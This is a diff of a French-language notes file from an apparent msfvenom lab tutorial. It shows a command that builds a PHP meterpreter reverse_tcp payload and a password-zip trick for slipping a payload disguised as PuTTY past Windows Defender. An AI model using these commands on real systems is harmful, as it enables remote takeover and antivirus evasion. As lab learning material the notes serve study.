@@ -245,7 +245,7 @@ msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.56.101 lport=7000 -f raw >
 
 ---
 
-```markdown
+
 ## TABLEAU COMPLET DES COMMANDES MSFVENOM
 
 ### LÉGENDE DES OPTIONS
@@ -408,9 +408,11 @@ je me suis beaucoup entrainer -__-
 
 #### apres beaucoup de test j ai remarquer que aucun des malwar present ici ne passer la detection des nouveau anti virus ainsi que la derniere mise a jour de windows defender dans windows 11 pour pouvoir tester tous les malwars sur windows 10 de votre virtual box vous devez passer par un dossier partager entre votre kali linux et votre pc .Et j ai compris que x64 ne va pas avec x86 il faut le meme nombre de bit
 
+
 <img width="1023" height="646" alt="image" src="https://github.com/user-attachments/assets/426be2fc-849c-4e40-9409-70f542313353" />
 
-ensuite il suffira de glisser et deposer depuis le racoursis dans votre kali linux mais cela marchera que pour les malwar tres bien fabriquer qui passe les anti virus car windows defender va mettre en quarantaine votre fichier alors ou vous desactivé temporairement windows defender ou vous taper cette commande avec le bon chemin qui permettra de faire passer le virus pour le tester 
+
+ensuite il suffira de glisser et deposer depuis le racoursis dans votre kali linux mais cela marchera que pour les malwar tres bien fabriquer qui passe les anti virus car windows defender va mettre en quarantaine votre fichier alors ou vous desactivé temporairement windows defender ou vous taper cette commande avec le bon chemin qui permettra de faire passer le virus pour le tester .
 
 ````bash
 zip -e -P defender_bypass /home/kali/Desktop/putty_ultimate.zip /home/kali/Desktop/putty_ultimate.exe
